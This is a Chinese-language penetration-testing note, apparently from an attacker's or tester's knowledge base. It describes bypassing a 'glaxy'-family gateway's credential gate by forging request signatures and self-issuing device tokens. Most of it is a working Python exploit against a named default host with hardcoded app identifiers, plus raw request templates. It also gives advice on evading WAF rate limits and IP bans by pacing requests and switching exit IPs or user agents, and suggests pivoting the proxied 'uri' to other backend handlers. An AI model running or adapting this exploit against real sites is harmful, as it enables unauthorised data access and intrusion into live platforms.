# glaxy 系网关「/api 前缀」变体：自签设备凭证绕过网关凭证门（未授权只读）

## 0. 适用面与前置
- 目标把前端 API 全部挂在 `/api` 前缀下（**没有** `_glaxy_<rand>_` 命名空间前缀），响应统一
  `{"head":{"errCode":...},"body":...}`，网关错误码形如 `GW_890201` / `GW_880102`。
- 本机直连 443 常被 TLS RST → 必须走 HTTP 代理（requests 必须 `trust_env=False` + 显式 proxies）。
- 边缘 WAF 要求携带首页下发的 cookie `magic_string`，值取自 `GET /` 的响应头 `Magic_string`。
- 边缘是**有状态**限速：连续约 5 发 POST 后转 `403` / 561B（`opencyresty`），静置约 200s 恢复。
  → 单发间隔 ≥3s，一批不超过 5 发。

## 1. 签名公式（客户端 bundle 里可离线复算）
```
Sign = MD5( sortString(JSON.stringify(body)) + Qid + AppId + v + token + u2token )
```
- `sortString(s)`：**字符升序排序后反转**（等价 `sorted(s, reverse=True)`，即字符降序），
  **不是** `s[::-1]`。写成纯倒序会得到 `GW_880102` 签名失败。
- `JSON.stringify(body)`：紧凑、无空格、非 ASCII 不转义
  （python: `json.dumps(body, separators=(",", ":"), ensure_ascii=False)`）。
- `token + u2token`：**无分隔符直接拼接**；首次请求 `webToken` 时两者为空串。
- `Qid`：每次请求现场重算的 nonce（毫秒时间戳 + 随机数再 MD5），必须与 header 里的 `Qid` 一致；
  重放旧报文一律签名失败。
- 常量 `AppId` / `productId` / `v` 全部来自前端 bundle，非凭据。

## 2. PoC（只读，优先跑负对照再跑数据面）
```python
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""glaxy 系网关 /api 变体：匿名自签设备凭证 → 未授权只读数据面（无写操作）"""
import base64, hashlib, json, random, sys, time
import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

HOST = sys.argv[1] if len(sys.argv) > 1 else "2f743j.com"
BASE = "https://" + HOST
APPID = "E2110C2DC886499B9C8E18A4DCECADD4"        # 取自目标前端 bundle，换目标需重取
PRODUCT_ID = "PcTfdNK4EdJvxLpbvoV8Kn2798OrtxE2"   # 同上
V = "1.0.0"
UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36")
PROXY = "http://127.0.0.1:25100"   # 直连被 RST 时填代理；不需要设 None
GAP = 3.0                          # 低于 3s 会被边缘 WAF 拒

s = requests.Session()
s.trust_env = False                # 必须：否则本机环境代理会污染
s.verify = False
s.proxies = {"http": PROXY, "https": PROXY} if PROXY else {}


def sort_string(x):
    return "".join(sorted(x, reverse=True))        # 升序排序后反转 == 字符降序


def md5(x):
    return hashlib.md5(x.encode()).hexdigest()


def compact(body):
    return json.dumps(body, separators=(",", ":"), ensure_ascii=False)


def headers(body, magic=None, token=None, u2token=None, device_id=None):
    q = md5(str(int(time.time() * 1000)) +
            "".join(str(random.randint(0, 9)) for _ in range(6)))
    sig = md5(sort_string(compact(body)) + q + APPID + V +
              (token or "") + (u2token or ""))
    h = {
        "Content-Type": "application/json",
        "User-Agent": UA,
        "Sign": sig,
        "AppId": APPID,
        "Qid": q,
        "v": V,
        "domainName": HOST,
    }
    if magic:
        h["Cookie"] = "magic_string=" + magic
    if token:
        h["token"] = token
    if device_id:
        h["deviceId"] = device_id
    return h


def post(path, body, **kw):
    time.sleep(GAP)
    r = s.post(BASE + path, data=compact(body), headers=headers(body, **kw), timeout=25)
    print(f"[{path}] HTTP {r.status_code} / {len(r.content)}B")
    print(r.text[:800])
    return r


# Step 0: 取边缘 WAF 通行 cookie
time.sleep(GAP)
r0 = s.get(BASE + "/", headers={"User-Agent": UA}, timeout=25)
magic = r0.headers.get("Magic_string") or r0.cookies.get("magic_string")
print("Magic_string =", magic)
if not magic:
    sys.exit("首页无 Magic_string：换出口 IP 或检查是否被 WAF 拦")

# Step 1: 匿名自助签发设备凭证
r1 = post("/api/webToken", {"productId": PRODUCT_ID}, magic=magic)
info = json.loads(base64.b64decode(json.loads(r1.text)["body"]["info"]))
device_id, token, u2token = info["deviceId"], info["token"], info["u2token"]
print("deviceId=%s token=%s... u2token=%s..." % (device_id, token[:8], u2token[:8]))

# Step 2: 只读数据面
post("/api/domain-info", {"productId": PRODUCT_ID}, magic=magic,
     token=token, u2token=u2token, device_id=device_id)

post("/api/live/proxy",
     {"paramObj": {"currentPage": 1, "pageSize": 4},
      "uri": "/public/live/room/getLiveRoomList",
      "productId": PRODUCT_ID},
     magic=magic, token=token, u2token=u2token, device_id=device_id)

# Step 3: 阴性对照（去掉设备凭证 → 应回 GW_890201）
post("/api/domain-info", {"productId": PRODUCT_ID}, magic=magic)
```

## 3. 手工复现（原始报文形态）
```http
GET / HTTP/1.1
Host: <HOST>
User-Agent: Mozilla/5.0 ... Chrome/130.0.0.0

-> 200，响应头 Magic_string: <MAGIC_STRING>（后续全程作 Cookie: magic_string=<MAGIC_STRING>）
```

```http
POST /api/webToken HTTP/1.1
Host: <HOST>
Cookie: magic_string=<MAGIC_STRING>
Sign: MD5(sortString({"productId":"<PRODUCT_ID>"})+Qid+AppId+v)
AppId: <APPID>
Qid: <现场随机 nonce>
v: 1.0.0
domainName: <HOST>
Content-Type: application/json

{"productId":"<PRODUCT_ID>"}
-> {"head":{"errCode":"0000"},"body":{"info":"<base64>"}}
   解 base64 得 {"deviceId":"...","token":"...","u2token":"..."}
```

```http
POST /api/live/proxy HTTP/1.1
Host: <HOST>
Cookie: magic_string=<MAGIC_STRING>
token: <token>
deviceId: <deviceId>
Sign: MD5(sortString({"paramObj":{"currentPage":1,"pageSize":4},"uri":"/public/live/room/getLiveRoomList","productId":"<PRODUCT_ID>"})+Qid+AppId+v+token+u2token)
AppId: <APPID>
Qid: <现场随机 nonce>
v: 1.0.0
domainName: <HOST>
Content-Type: application/json

{"paramObj":{"currentPage":1,"pageSize":4},"uri":"/public/live/room/getLiveRoomList","productId":"<PRODUCT_ID>"}
-> 200 {"head":{"errCode":"0000","errMsg":"操作成功"},"body":{"totalCount":13,"list":[{"id":...,
   "nickName":"...","userId":...,"title":"...","replay":"https://<CDN>/live/<id>.m3u8",
   "stream":"...","thumb":"https://<S3-bucket>/...","viewers":8,"heat":13604}]}}
```

`uri` 是网关侧转发的后端真实路径，换一个 `uri` 就是打另一个 handler；只读接口优先试
`/public/live/room/getLiveRoomList`、配置类 `/api/domain-info`。

## 4. 判据
| 观察 | 结论 |
|---|---|
| `/api/webToken` → `errCode=0000`，`body.info` base64 可解出 deviceId/token/u2token | 匿名签发成立 |
| 带 token+deviceId 头 → `errCode=0000` + 业务字段（totalCount/list、is_agent_domain/channel） | 未授权读取成立 |
| `POST /api/<不存在的路径>` → 200 `{"timestamp":...,"status":404,"error":"Not Found","path":...}` | Spring 404 基线，用来排除「SPA 兜底页/缓存假 200」 |
| 同 handler 去掉 token/deviceId 头（Sign 也不含 token+u2token） → `GW_890201 会员访问凭证为空` | 门禁就是**设备凭证**，不是会员登录态 |

## 5. 失败排查
| 现象 | 原因 |
|---|---|
| `GW_880102` 签名验证失败 | sortString 写成 `s[::-1]`；JSON 带空格/转义；header Qid 与参与签名的 Qid 不一致；重放了旧报文 |
| `GW_890201` 会员访问凭证为空 | 没带 `token`+`deviceId` 头，或 Sign 里漏拼 `token+u2token` |
| `403` / 561B `opencyresty` | 触发边缘限速：停手冷却 ≥3 分钟，拉长间隔到 3–5s |
| Spring 404 JSON | 路径/`uri` 写错或 handler 不存在 |
| TLS RST / 连接重置 | 没走代理；或出口 IP 已被边缘拉黑，换出口 |
| 首页拿不到 `Magic_string` | WAF 已拦该 IP/UA，换出口或换 UA 再取 |

## 6. 影响与定级
任意无账号方（只需能访问站点并离线复算 MD5）即可读：直播间主播 `userId`/昵称/流 id/回放 m3u8/
S3 缩略图桶/热度统计、平台域配置（`is_agent_domain`、`channel`）。未触及会员账号资料与资金接口，
按只读信息泄露定 **medium**。若同网关下存在写类 handler（`uri` 形如 `/update`、`/save`、`/bet`），
风险应上调为 high/critical——**验证前必须先确认无副作用**。

## 7. 同族参考
- 知识库 id=160：`_glaxy_tus5r4_` 命名空间变体，`POST /<NS>/webToken` + `/<NS>/club/proxy`，
  同一签名族，命中过 cryptoKey/secretKey/内网 IP。换目标时先判断用哪套前缀（看首页 bundle 里的请求 URL）。
